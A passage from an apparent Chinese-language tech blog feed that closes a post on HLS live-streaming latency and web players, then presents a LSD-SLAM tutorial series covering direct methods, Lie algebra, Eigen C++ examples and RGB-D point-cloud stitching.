#EXTM3U#EXT-X-VERSION:3#EXT-X-TARGETDURATION:5#ID3-EQUIV-TDTG:2016-11-26T02:40:23#EXT-X-MEDIA-SEQUENCE:376#EXT-X-TWITCH-ELAPSED-SYSTEM-SECS:1511.137#EXT-X-TWITCH-ELAPSED-SECS:1508.980#EXT-X-TWITCH-TOTAL-SECS:1535.137#EXTINF:4.000,index-0000000377-6zCW.ts#EXTINF:4.000,index-0000000378-vHZS.ts#EXTINF:4.000,index-0000000379-Gkgv.ts#EXTINF:4.000,index-0000000380-PNoG.ts#EXTINF:4.000,index-0000000381-h58g.ts#EXTINF:4.000,index-0000000382-W88t.ts

6 個片段乘上 4 秒 &#x3D; 24 秒可是如果你仔細觀察（開 chrome devtool 就可以了），實際上 twtich 的播放器在拿到列表以後，會直接嘗試從「倒數第三個」片段開始載入，所以延遲就縮短為 3 個片段乘上 4 秒 &#x3D; 12 秒了  
再來看看台灣的 livehouse.in
#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:NO#EXT-X-MEDIA-SEQUENCE:2291#EXT-X-TARGETDURATION:6#EXTINF:5.2090001106262207,1480116261segment_v02291.ts#EXTINF:5.2080001831054688,1480116261segment_v02292.ts#EXTINF:5.2080001831054688,1480116261segment_v02293.ts

5 乘上 3 &#x3D; 15 秒  
所以一般用 hls 的直播網站，延遲大概都會在 10~20 秒這個區間以內我猜比這個短的話對 server 壓力可能很大，而且網速慢的話，看起來會很卡比這個長的話雖然很順，但是使用者體驗不太好，延遲太高所以能找到最好的延遲就是在這個區間內了
最後，我們來看看如果要在網頁上播放的話，有哪些選擇因為現在已經是個 flash 快死掉的年代了，所以如果可以的話，首選當然是 html5瀏覽器支援度不夠高的話再 fallback 回去 flash
先來介紹一下現成的商業授權播放器，例如說 jwplayer 或是 flowplayer，都是很不錯的選項。尤其是當 open source 的方案出現問題你又修不好的時候，就會很希望公司花錢買一個商業播放器，一切問題都搞定。
open source 的方案大概就是 videojs 一支獨秀了，有沒有其他的後起之秀我是不知道啦，有的話麻煩推薦一下。
然後因為 hls 這個格式瀏覽器本身是沒辦法播放的（除非是 iOS 或是 Safari），所以要搭配一些 pluginvideojs 官方有一個 videojs-contrib-hls，加上去之後就可以播放了，但我自己用過以後感覺不是很好。
最後選擇了知名的影音網站 dailymotion 提供的開源解決方案 hls.js。
這一篇是他們官方的部落格，有介紹說為什麼要自己寫一套，以及解決了哪些問題，滿值得一看的，可以順便了解一下。
另外，hls 也支援在不同的頻寬下的自動切換，它的檔案會長成這樣：
#EXTM3U#EXT-X-STREAM-INF:BANDWIDTH=1280000,AVERAGE-BANDWIDTH=1000000http://example.com/low.m3u8#EXT-X-STREAM-INF:BANDWIDTH=2560000,AVERAGE-BANDWIDTH=2000000http://example.com/mid.m3u8#EXT-X-STREAM-INF:BANDWIDTH=7680000,AVERAGE-BANDWIDTH=6000000http://example.com/hi.m3u8#EXT-X-STREAM-INF:BANDWIDTH=65000,CODECS=&quot;mp4a.40.5&quot;http://example.com/audio-only.m3u8

提供不同頻寬下應該載入的檔案，例如說網路狀況很好，就載入高畫質的，不好的話就載入低畫質。很多播放器也都可以支援這類型的檔案清單，可以自動偵測網速調整畫質，是個很厲害的功能。
結論其實在直播這一塊，前端工程師能做的真的不多。要真的做到極致的話，大概就是去優化播放器了，可是這是一件超級困難的事情，因為你必須要懂一大堆東西才能做好這一塊，而且要付出的成本也很高。
建議大家還是先找現成的開源播放器來用，至少碰到問題還有可能自己修，也不用自己再動手做一個。開源的解決方案不行的話，再參考商業上授權的播放器，通常就很夠用了。如果都還是不行，在時間跟成本都允許的情況下，再自己做一個播放器出來。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>hls</tag>
        <tag>streaming</tag>
        <tag>videojs</tag>
        <tag>hlsjs</tag>
      </tags>
  </entry>
  <entry>
    <title>深入學習 LSD-SLAM-1</title>
    <url>/2017/03/18/lsd-slam-1/</url>
    <content><![CDATA[前言SLAM 是近年來很火紅的一個技術，也有不少文章在介紹，不過我很少看到針對一些頂級演算法的深入介紹，所以才想透過這篇文章來開始深入很久以前玩過的LSD SLAM，也跟大家一起學習這個迷人的演算法。建議有興趣的讀者先讀過這篇平易近人的 Visual SLAM 簡介，然後再繼續往下看，會更有感覺！
先放一張 LSD-SLAM 建出來的地圖，讓大家感受一下帥度。

安裝方式安裝方式可以到 LSD-SLAM 的 github page 看看，筆者很久以前跑過 Ubuntu 12.04 上面的版本，建議可以看看作者的溫馨提示，比較容易建出好的地圖。
如果想看中文的安裝教學，也可以看看這一篇 LSD-SLAM 編譯過程 (Ubuntu 14.04 + ROS Indigo)
演算法簡介
從上圖中我們可以看到，LSD-SLAM 演算法的一個特色就在於它不需要計算特徵點，這個特色在 real-time 的應用中滿重要的，畢竟一般影像是以 30 fps的速率進來，也就是一張影像只能處理 33 ms，要怎麼在這麼短的時間內就處理完一幀，是一個問題。有些計算特徵的演算法雖然厲害(例如 SIFT、ORB)，但計算時間太長，佔掉 30 ms 的一大部分，就很難在 real-time 應用中派上用場。
LSD-SLAM的基本想法就是利用所有 pixel 資訊不斷計算目前相機所在的位置，等到目前的位置離前一個 keyframe 足夠遠，就儲存一張新的 keyframe。並且在過程中不斷計算 depth map 形成 point cloud map，也不斷對 map 做 optimization 計算。
如此一來，就可以形成一個完整的 map，整個 map 就是一個巨大的 pose graph，graph 裡面的 vertice 是 keyframe，edge 就是連接 keyframe 的 3D similarity transform。
總結這篇很簡單地介紹了 LSD-SLAM，算是一個起頭，讓大家對這個演算法有基本的認識，之後我會慢慢深入裡面的細節，也會逐漸變得好玩！
延伸閱讀
雷鋒網 SLAM 相關文章
相機位姿估計0：基本原理之如何解PNP問題
SLAM Tutorial@ICRA 2016
高翔大神的blog
CMU Designing Computer Vision Apps - lecture 19

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>深入學習 LSD-SLAM - 2</title>
    <url>/2017/04/15/lsd-slam-2/</url>
    <content><![CDATA[前言上回我們在深入學習 LSD-SLAM - 1中提到，LSD-SLAM 的一大特色是不計算特徵點、直接使用所有 pixel 來計算相機的姿態。但是，每一幀都有 640x480 個 pixel (作者建議使用 640x480 解析度的相機)，該怎麼處理這些資料呢？今天就來學習 direct method 的基礎。
在開始之前，我們可以從下圖清楚地看出 Feature-Based Method 跟 Direct Method 的差別，其實就是差在有沒有先抽取特徵點。

Direct Method 的基本概念使用條件與假設Direct method 是直接根據 pixel 值來計算相機姿態，這個方法要成立，需要建立在一個假設 - 灰階程度不變之上。
灰階程度不變假設: 同一個空間點在不同影像中的亮度值相同

就是因為有灰階程度不變的假設，我們才能夠直接使用 pixel 值來計算相機姿態，雖然這個假設在現實中常常不成立，但是我們還是可以在這假設之上計算出漂亮的地圖。
怎麼讓電腦來解這個問題?若灰度不變假設成立，那我們就可以開始進行下一步了！但如果你摩拳擦掌地想要開始來寫程式，會發現一件事 - 要怎麼開始寫程式咧?
這時候，就是數學派上用場的良機了。請看看下面這個投影片的 Direct method 部分:

在世界中的一點 $p_i$，會投影在兩個時刻 ($k-1$ 與 $k$) 相機拍到的畫面上，形成 $u_i$ 以及 $u’i$，我們要做的事情，就變成找出讓 $ \sum{i} || I_k(u\prime_i)-I_k-1(u_i)||^2 \ $  最小的 Transform - $T_k,k-1$。
於是我們得到了一個可以被最佳化的東西，稱為 Photometric error，有了這個 error，我們就知道寫程式的時候要優化的值是什麼、什麼叫做好的 pose estimation，也才有機會進行下一步。
如果想要更加體會最佳化是什麼樣的動態過程、增加腦海中的對最佳化的想像畫面，我很推薦你去看看這篇文章的 “6.直接法的討論”，裡面的舉例應該非常好懂，也可以加深體會。
其實這一塊要繼續討論下去才能夠真正接到程式碼，不過要再繼續深入，需要不少數學基礎，我會在之後的系列漸漸補上，然後再回來 revisit。
總結這次跟大家介紹了 LSD-SLAM 的基礎，如果不懂 Direct method，就無法再深入體會 LSD-SLAM 的奧妙，我們下回見！
延伸閱讀
直接法

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有&gt;少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>深入學習 lsd-slam - 3</title>
    <url>/2017/05/13/lsd-slam-3/</url>
    <content><![CDATA[前言在 深入學習 LSD-SLAM - 2 裡面，我們簡單介紹了 Direct Method，先初步地了解這個方法的大致意義，今天再讓我們更深入一點，開始跟 paper 的內容銜接，之後會慢慢越來越深入好玩！
Spiral learning因為這次剛好也是我第一次真正來學 SLAM 相關技術，以前都只是大略看看，沒有真正學通的感覺，所以也想跟大家分享一下個人學習的心得。
大家或多或少應該都經歷過一個情境 - 你要學習一個東西，但是因為這個東西並不是你熟悉的，所以你很容易在還沒學通前就卡住。但是隨著你用各種方法（例如：找不同的資料、上論壇發問、找厲害的朋友問、自己慢慢沉思等等），你會在某個時刻突然通某些原本不通的點。
啊為什麼要說這件事呢?
因為如果你可以看得到自己是怎麼學習的，你才有機會優化自己的學習方法，或至少能更好地安排時間來學習困難的技術。我們的學習過程往往不會是一直線，因為你一開始就是不會，才需要學，那又怎可能容易讓你一帆風順地從不會學到會。就算修課，老師已經盡量將課程內容整理清楚，也不一定完全適用於你的學習，所以你還是需要作一些額外的變通來幫助自己真正學通。
有人把這種學習的過程稱作 Spiral learning，Google 一下就可以看到很多 相關的資料。
像我自己目前就比較喜歡用時間來沉澱，然後在適當的時機再次學習，往往就能達到更好的效果，這樣的習慣在面對真正困難的題目的時候，比較容易有機會學通。雖然代價是更長的時間，不過只要願意優化，總是有機會再找出優化學習法的機會。我覺得有一篇文章 - 《時間與節奏的力量》把我想說的概念用另一種方式很清楚地再說一次，推薦給想要解決困難問題的朋友！
接下來我們先切回正題，隨著這個系列文的進展，我們會一起越來越深入 LSD SLAM！
再訪 Direct Method一般來說，我們要學習一個東西，需要先抓到他的主要概念。像是 Direct method，我們總是要先見林，比較知道怎麼看裡面的樹。如果你有點忘記上次說了什麼，可以 回去翻翻。
首先，我們先回憶一下，現在的目的是什麼；

是要定位相機 pose，並同時定位
為達目的，這邊需要用影像資訊來估計 pose
為了估計 pose，需要計算 photometric error

然後，我們就接到論文中的這個公式了：

裡面的 $i$ 就是指 pixel 的 index，也就是說，這個公式是已知 $\xi$ （兩張影像之間的相機 pose 轉換），要計算在這個 $\xi$ 下，所有兩張影像中兩兩對應的 pixel 值相減完的總和，可以想像成是殘餘的誤差（residual）。對第 $i$ 個 pixel 來說，殘餘誤差就是 $ r_i(\xi) $，所以 $E(\xi)$ 就是所有殘餘誤差平方的總和。
$\xi$、$\omega$ 是什麼?雖然我們現在大致上知道上面公式的意義，但是眼尖的讀者會發現裡面有一些不明的定義，例如 $\xi$ 以及 $\omega$。首先讓我們翻翻論文，他前面就有先提到這兩者：


很顯然，因為 $\omega$ 裡面需要用到 $\xi$，所以應該先了解他，再來了解 $\omega$。在這邊，我們暫且先把 $\xi$ 想成是 $G$，是一種 transform。然後 $\omega$ 是一種 warping，對深度為 $d$ 的點 $p$ 進行 $\xi$ 的 transform。
再度深入 $\xi$上一個小段落裡，我們知道 $\xi$ 大概是跟 $G$ 有點關係，但是關係還不明確，只有一個糊糊的概念，現在就讓我們來理清楚。
3D Rigid body transform要弄清楚 $G$ 跟 $\omega$ 的關係，我們要先弄懂 $G$ 跟 $\omega$ 分別是什麼，然後才能看關係。所以我們從比較簡單的 $G$ 開始。
$G$ 就是一個可以對三維世界中的任意一點 $x$，做一個操作，使得 $x$ 點被轉換到 $x^\prime$：

從 這個網頁 可以看到對一群點做一樣的 transform 的效果。
李群與李代數好，上面講的這個 transform 我們已經懂了，下一個問題就是，$SO(3)$ 跟 $\mathfrak{se}(3)$ 又是什麼東西呢？以下我們依次簡介：

群：同一種東西的集合再加上同一種運算所構成的結構。記成 $(A,\cdot)$，要注意的是， $\cdot$ 運算需要滿足幾個條件，其中一個是封閉性：
$$\forall a_1, a_2, \quad a_1 \cdot a_2 \in A$$


剩下的我們等有需要再提。

$SO(n)$：特殊正交群，也就是 $n$ 維空間上的旋轉矩陣構成的群。所以你可以想像，你手上有一群 $n \times n$ 的矩陣，每個都符合下式中旋轉矩陣的特性，那這一群矩陣，跟這群矩陣可以做的運算就構成了 $SO(n)$。
$\begin{equation} SO(n) &#x3D; { \mathbf{R} \in \mathbb{R}^{n \times n} | \mathbf{R R}^T &#x3D; \mathbf{I}, det(\mathbf{R})&#x3D;1 } \end{equation}$

$SE(n)$：概念上在 $SO(n)$ 的旋轉矩陣上加上一個平移向量。例如 $SE(3)$ 的定義如下。




$\mathfrak{so}(3)$ 跟 $\mathfrak{se}(3)$：李代數，他的定義是在單位矩陣處的正切空間（tangent space），這很難簡單敘述，建議有興趣的讀者可以去看看 這篇文章，之後有需要我再仔細描述。

所以！綜合以上所述，你會知道原來 $G$ 就是 $SE(3)$ 這種群，可以對三維空間中的點做旋轉和平移。然後，$\xi$ 是 $\mathfrak{se}(3)$ ，就是被定義在 $SE(3)$ 單位矩陣位置的 tangent space。
你可能想問，我們明明直接使用 transform，然後想辦法計算出 $E(\xi)$ 就好了，何必用到什麼李群或是李代數呢？
其實，問題就在於，我們想要優化的 transform 有 6 個變數，你想要有效率地優化有 6 自由度的東西，就會需要算導數（之後會引出 Jacobian 矩陣），且因為我們想要優化的目標還具備一些數學上的特性，如果能對他掌握得更好，我們就能更有效率地解決最佳化問題。
我現在的理解只夠說出這樣的解釋，不過隨著之後的系列往下看，我們會更能發掘引進李代數的美妙之處。
再訪 $\omega$所以，到這邊我們可以對 $\omega$ 更加了解，他其實就只是一個運算，因為 $\xi$ 僅僅定義了這個 transform，但是沒有定義該怎麼對一個點操作。這也是為什麼我們需要 $\omega$。前面提過，$\omega$ 是一種 warping，對深度為 $d$ 的點 $p$ 進行 $\xi$ 的 transform。之所以要定義深度 $d$，是因為 $p$ 只是一個二維平面上的一點，當然在這篇論文中指的就是影像上的一個 pixel。但是 $\omega \in se(3)$ 顯然需要對三維空間中的一點操作，所以需要 $d$ 的資訊。
總結這次開始從一個比較 rough 的概念，深入到一點點論文中的細節了。我希望把這系列定位成真正了解論文的一個系列，所以對於有相關基礎的讀者來說可能覺得過程寫得太簡單。不過，網路上太多寫得不清楚的資源了，對基礎不夠的人學起來應該頗痛苦（像我就是），所以還是希望可以提供一個比較完整的系列，也嘗試在裡面使用 spiral learning 的技巧不斷重訪某些觀念、不斷深入。
隨著我們慢慢地進展，我們準備可以把優化 $E(\xi)$ 的各項細節都好好地來通達一下，我們下回再見！
延伸閱讀
LSD-SLAM深入學習（2）-算法解析
視覺 SLAM 中的數學基礎 第一篇 3D 空間的位置表示
lie group and computer vision : 李群、李代數在計算機視覺中的應用
Multiple View Geometry - Lecture 3 (Prof. Daniel Cremers)

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>深入學習 LSD-SLAM - 4</title>
    <url>/2017/07/08/lsd-slam-4/</url>
    <content><![CDATA[前言上次講了一些基本的理論介紹，但我們現在是希望學會如何實際寫程式讓機器人動起來，只有純數學的觀念跟機器人好像沒什麼關係，所以這次希望可以開始銜接到一個常用的工具 - Eigen。讓大家有動手實作、開始玩到東西的感覺。
為什麼要會 Eigen？首先，Eigen 是一個 C++ 的 open source library，提供了許多線性代數運算相關的函式。
然後，我們這一系列是要介紹 LSD-SLAM，所以當然是因為 LSD-SLAM 也使用 Eigen 這個 library 來處理線性代數的運算，你可以在 lsd-slam 的 repository 裡搜尋 eigen，就會看到 以下的結果。
另外，還有許多的工具，例如 g2o、sophus 也都有使用 Eigen，所以了解這個工具算是滿必要的。
安裝與小玩一下 Eigen安裝滿簡單的，直接用下面這個指令就好:
sudo apt-get install libeigen3-dev

安裝完成之後，你應該可以在 &#x2F;usr&#x2F;include&#x2F;eigen3 裡面找到相關的檔案，如果你進去看一下，就會看到很多酷炫的功能:

接下來就讓我們來寫一個矩陣的小程式，首先先新增一個資料夾，開始寫 code：
mkdir test_eigenvim eigenMatrix.cpp

#include &lt;iostream&gt;using namespace std;#include &lt;Eigen/Core&gt;int main( int argc, char** argv )&#123;    // Eigen 中所有向量和矩陣都是Eigen::Matrix。它的前三個參數分別是：資料行態，row 數，col 數    // 宣告一個 2x3 的 float 矩陣    Eigen::Matrix&lt;float, 2, 3&gt; matrix_23;    // 初始化 matrix 的 element    matrix_23 &lt;&lt; 1, 2, 3, 4, 5, 6;    // 輸出    cout &lt;&lt; matrix_23 &lt;&lt; endl;    // 用 () 來存取 matrix 中的 element    for (int i=0; i&lt;2; i++) &#123;        for (int j=0; j&lt;3; j++)            cout&lt;&lt;matrix_23(i,j)&lt;&lt;&quot;\t&quot;;        cout&lt;&lt;endl;    &#125;		return 0;&#125;

寫完之後呢，還需要編譯，這邊也推薦大家使用 cmake，畢竟 ROS package 都使用 catkin_make，而 底層其實還是 cmake！
vim CMakeLists.txt

裡面的內容是:
cmake_minimum_required( VERSION 2.8 )project( eigenMatrix )set( CMAKE_BUILD_TYPE &quot;Release&quot; )set( CMAKE_CXX_FLAGS &quot;-O3&quot; )# Include Eigen headersinclude_directories( &quot;/usr/include/eigen3&quot; )# in osx and brew install# include_directories( /usr/local/Cellar/eigen/3.3.3/include/eigen3 )add_executable( eigenMatrix eigenMatrix.cpp )

接下來編譯跟執行只需要:
cmake .make./eigenMatrix

你應該就可以看到如下的輸出了:
ros@ros-K401UB:~/code/eigen$ ./eigenMatrix 1 2 34 5 61	2	3	4	5	6	

眼尖的你應該會發現，資料夾裡面多了好多編譯過程中自動產生的文件，有點亂。所以，我們可以開一個 build 資料夾，讓這些中間產物都被放在這個資料夾，如果今天想要砍掉中間產物，砍掉這個資料夾就好了！這種方法會讓編譯過程變成：
mkdir buildcd build cmake ..make

相信有自己使用過 cmake 的讀者，對上面的步驟一定不陌生！
解線性方程組 &amp; 座標轉換線性代數也常常被用來解線性方程組或是來做座標轉換，如果你想要試著解看看，請參考這篇 解 least square 方法 跟 Space Transform。
我們再來寫一個小程式來更熟悉 Eigen：
#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;#include &lt;Eigen/Core&gt;// Eigen/Geometry 提供了各种旋轉和平移的功能#include &lt;Eigen/Geometry&gt;int main ( int argc, char** argv )&#123;    // 3D 旋轉矩陣直接使用 Matrix3d 或 Matrix3f    Eigen::Matrix3d rotation_matrix = Eigen::Matrix3d::Identity();    	// AngleAxis 就是旋轉向量,	//沿 Z 軸轉 45 度    Eigen::AngleAxisd rotation_vector ( M_PI/4, Eigen::Vector3d( 0,0,1 ) );     cout .precision(3);	//用matrix()轉成矩陣輸出    cout &lt;&lt; &quot;rotation matrix =\n&quot; &lt;&lt; rotation_vector.matrix() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;        	// 接著我們產生大家熟悉的旋轉矩陣    rotation_matrix = rotation_vector.toRotationMatrix();    	// Eigen 使用 typedef 提供了許多容易理解的資料型態，但 Vector3d 其實只是 Eigen::Matrix&lt;double, 3, 3&gt;	Eigen::Vector3d v ( 1,0,0 );    	// 用旋轉向量來旋轉	Eigen::Vector3d v_rotated = rotation_vector * v;    cout &lt;&lt; &quot;(1,0,0) after rotation = &quot; &lt;&lt; v_rotated.transpose() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    	// 或者用旋轉矩陣旋轉    v_rotated = rotation_matrix * v;    cout &lt;&lt; &quot;(1,0,0) after rotation = &quot; &lt;&lt; v_rotated.transpose() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    // Euler angle: 可以從旋轉矩陣直接算出    Eigen::Vector3d euler_angles = rotation_matrix.eulerAngles ( 2,1,0 ); // roll pitch yaw    cout &lt;&lt; &quot;yaw pitch roll = &quot; &lt;&lt; euler_angles.transpose() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    // 四元數    // 可以直接把用 AngleAxis 來初始化    Eigen::Quaterniond q = Eigen::Quaterniond ( rotation_vector );    cout &lt;&lt; &quot;quaternion = \n&quot; &lt;&lt; q.coeffs() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;   // 順序是(x,y,z,w)    // 也可以用旋轉矩陣來初始化    q = Eigen::Quaterniond ( rotation_matrix );    cout &lt;&lt; &quot;quaternion = \n&quot; &lt;&lt; q.coeffs() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    // 使用四元數來旋轉向量(應該要跟之前用旋轉向量或旋轉矩陣的結果一樣)    v_rotated = q*v;     cout &lt;&lt; &quot;(1,0,0) after rotation = &quot; &lt;&lt; v_rotated.transpose() &lt;&lt; &quot;\n&quot; &lt;&lt; endl;    return 0;&#125;

你執行成功之後應該可以看到下面的輸出：
rotation matrix =    0.707    -0.707         0    0.707     0.707         0        0         0         1(1,0,0) after rotation =    0.707    0.707        0(1,0,0) after rotation =    0.707    0.707        0yaw pitch roll = 0.785 -0  0quaternion = 000.3830.924quaternion = 000.3830.924(1,0,0) after rotation =    0.707    0.707        0

總結這次很簡單地跟大家介紹了 Eigen 這個 library，希望可以讓大家之後看到 Eigen 這個 library 會比較有親切跟熟悉的感覺，我們下回再見！
延伸閱讀
高翔大神書中 ch3 的程式碼
Eigen 的官方 module 列表 
Eigen 的官方 Quick Reference（類似 cheatsheet）

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在鍛鍊自己的執行力
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
        <tag>Eigen</tag>
      </tags>
  </entry>
  <entry>
    <title>深入學習 lsd-slam - 5</title>
    <url>/2017/08/05/lsd-slam-5/</url>
    <content><![CDATA[前言上次跟大家簡介了 Eigen 這個可以用來做線性代數運算的 open source library，讓大家有動手實作、開始玩到東西的感覺。今天要延續動手實作的精神，跟大家介紹一下該怎麼把幾張 RGB-D 影像拼接成 point cloud，接下來就讓我們一起玩玩吧！
參考資料來源這次的 data（包含 RGB 影像跟 Depth Map） 等等都是來自於 slambook 的 ch5，有這些資料真的超讚的，不然自己光要產生這些資料就得花一些時間，還要有硬體，比較難快速地上手。
核心概念我們擁有的 data 是 RGB-D 感測器在 5 個不同的 pose 底下拍到的影像，利用相機的內部參數將一組 RGB-D 影像中的像素對應回 3D 相機座標系下的 point cloud，然後再利用各組圖的 camera pose，將各組 point cloud 對應到同一個世界座標系下，就能組合出地圖。
其中 pose.txt 儲存的格式是平移向量加上旋轉四元數：
$[x, y, z, q_x, q_y, q_z, q_w]$
如果你對內部參數和外部參數的概念不熟，網路上有頗多資源，個人覺得延伸閱讀 1 的講解算是十分清楚的，推薦去看看！
實作基本函式庫安裝首先要安裝 OpenCV2，因為待會寫程式需要讀取影像，因為 OpenCV 也是一個 cmake project，步驟比較複雜一些，可以直接看看官方安裝頁面。
然後是安裝 PCL：
sudo add-apt-repository ppa:v-launchpad-jochen-sprickerhof-de/pclsudo apt-get updatesudo apt-get install libpcl-all

程式碼接下來就是程式碼啦，其實你可以先跑起來再慢慢理解：
#include &lt;iostream&gt;#include &lt;fstream&gt;using namespace std;#include &lt;opencv2/core/core.hpp&gt;#include &lt;opencv2/highgui/highgui.hpp&gt;#include &lt;Eigen/Geometry&gt; #include &lt;boost/format.hpp&gt;  // for formating strings#include &lt;pcl/point_types.h&gt; #include &lt;pcl/io/pcd_io.h&gt; #include &lt;pcl/visualization/pcl_visualizer.h&gt;int main( int argc, char** argv )&#123;    vector&lt;cv::Mat&gt; colorImgs, depthImgs;    // 彩色影像和深度影像    vector&lt;Eigen::Isometry3d&gt; poses;         // 相機 pose         ifstream fin(&quot;./pose.txt&quot;);    if (!fin)    &#123;        cerr &lt;&lt; &quot;必須在有pose.txt的目錄下執行此程式&quot; &lt;&lt; endl;        return 1;    &#125;        // 讀取彩色影像、深度影像以及對應的相機 pose    for ( int i=0; i&lt;5; i++ )    &#123;        boost::format fmt( &quot;./%s/%d.%s&quot; );         colorImgs.push_back( cv::imread( (fmt%&quot;color&quot;%(i+1)%&quot;png&quot;).str() ));        depthImgs.push_back( cv::imread( (fmt%&quot;depth&quot;%(i+1)%&quot;pgm&quot;).str(), -1 ));                 double data[7] = &#123;0&#125;;        for ( auto&amp; d:data )            fin&gt;&gt;d;        Eigen::Quaterniond q( data[6], data[3], data[4], data[5] );        Eigen::Isometry3d T(q);        T.pretranslate( Eigen::Vector3d( data[0], data[1], data[2] ));        poses.push_back( T );    &#125;        // 計算 point cloud 並接起來    // 指定相機內部參數    double cx = 325.5;    double cy = 253.5;    double fx = 518.0;    double fy = 519.0;    double depthScale = 1000.0;        cout &lt;&lt; &quot;正在將影像轉換為 point cloud ...&quot; &lt;&lt; endl;        // 定義 point cloud 使用的格式：這邊用的是XYZRGB    typedef pcl::PointXYZRGB PointT;     typedef pcl::PointCloud&lt;PointT&gt; PointCloud;        PointCloud::Ptr pointCloud( new PointCloud );     for ( int i=0; i&lt;5; i++ )    &#123;        cv::Mat color = colorImgs[i];         cv::Mat depth = depthImgs[i];        Eigen::Isometry3d T = poses[i];        for ( int v=0; v&lt;color.rows; v++ )            for ( int u=0; u&lt;color.cols; u++ )            &#123;                //使用內部參數與深度值算出相機座標系下的 point cloud                unsigned int d = depth.ptr&lt;unsigned short&gt; ( v )[u]; // 深度值                if ( d==0 ) continue; // 深度為0表示沒有量到                Eigen::Vector3d point;                 point[2] = double(d)/depthScale;                 point[0] = (u-cx)*point[2]/fx;                point[1] = (v-cy)*point[2]/fy;                      //用外部參數轉換到世界座標系底下            	Eigen::Vector3d pointWorld = T*point;                PointT p ;                p.x = pointWorld[0];                p.y = pointWorld[1];                p.z = pointWorld[2];                p.b = color.data[ v*color.step+u*color.channels() ];                p.g = color.data[ v*color.step+u*color.channels()+1 ];                p.r = color.data[ v*color.step+u*color.channels()+2 ];                pointCloud-&gt;points.push_back( p );            &#125;    &#125;        //儲存 point cloud    pointCloud-&gt;is_dense = false;    cout &lt;&lt; &quot;There are total &quot; &lt;&lt; pointCloud-&gt;size() &lt;&lt; &quot; points in the map.pcd.&quot; &lt;&lt;endl;    pcl::io::savePCDFileBinary(&quot;map.pcd&quot;, *pointCloud );    return 0;&#125;

編譯與執行接下來就是編譯啦：
mkdir buildcd build cmake ..makemv joinMap ../cd ..

編譯完就可以執行並觀察產生的 map.pcd 檔了。
./joinMappcd_viewer map.pcd

一開始開啟 pcd_viewer ，會看到所有的 pointcloud都是同一個顏色的，要按 5 才能進入 RGB 的模式，如果你有正確執行，應該會看到如下面這張圖的效果：

總結這次很簡單地跟大家介紹了該怎麼使用相機的內部參數和外部參數，推得每個 pixel 在世界座標系中的位置，進而產生出 pointcloud，大家在有空時也不妨思考一下，我們是怎麼認識這個三維世界的，為何我們不需要知道每個 pointcloud 的確切位置就可以做好生活中的各項事情呢？
我們每天都在使用很多高級的演算法、完成很多複雜的事情，如果能將這些演算法實作於機器人，那就可以造出超級高級的機器人了，不過這一點也不容易就是了。
延伸閱讀
Pinhole Camera：相機座標成像原理

關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在學習看清事物的本質與改進自己的觀念
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>深入學習 LSD-SLAM 番外篇 - RDS X RTAB-Map</title>
    <url>/2017/06/10/lsd-slam-side-1/</url>
    <content><![CDATA[前言因為前陣子因緣際會發現了 Robot Ignite Academy 跟 ROS Develop Studio（RDS），很希望可以推薦給我們的讀者。所以這期專欄我延伸一下 LSD SLAM 系列，先跟大家介紹這個很酷的學習資源，並介紹跟 LSD SLAM 目的相似的 RTAB-Map 演算法。
為什麼要介紹 RDS？學習的方法有許多種，借引用這一週很紅的 英文學習 repository 的圖：

學習越難的東西，越不容易只靠單一學習資源就學通透，舉例來說，你很難只看文章不動手實作就真的學會寫程式。
同樣地，學習機器人如果不碰機器人，很難真正弄懂機器人。Gazebo 的出現確實幫助許多無法輕易取得機器人的人，使用模擬機器人來學習。但是，如果對 Linux 不熟，很可能在環境安裝的階段就會碰到障礙導致學習中斷。
今天介紹的 RDS 就可以先排除學期初期的環境設定問題，直接使用 Web UI 來呈現模擬器、command window、檔案系統，讓使用者可以直接切入機器人的開發。除此之外，Robot Ignite Academy 直接提供了跟 RDS 整合在一起的線上課程，等於是你完全不需要有任何基礎準備，你只要有一個瀏覽器，就可以連上 RDS 開始學習機器人。
就是因為他們提供了一個很方便的學習環境，所以我才想寫一篇文章來跟大家分享，或許可以幫助更多人更容易感受到學習機器人的滋味。
RDS 簡介RDS 是 The construct 這間公司開發出來的工具，下圖是我去上他們的課程截的圖，你可以看得出來，最左邊是課程內容，右邊有檔案系統的 UI、模擬器畫面，下方還有 command window 以供輸入指令。視窗的安排也有幾種配置方式，可以隨自己喜歡去編排。

想要使用 RViz 等工具也不用緊張，可以額外開一個分頁顯示桌面，個人覺得應有盡有了。

Robot Ignite Academy看完上面的介紹，你可能會問，現在有哪些東西可以用 RDS 學？
基本上都在這個截圖裡了，是說未來也還會再增加，所以有興趣的讀者可以持續關注。

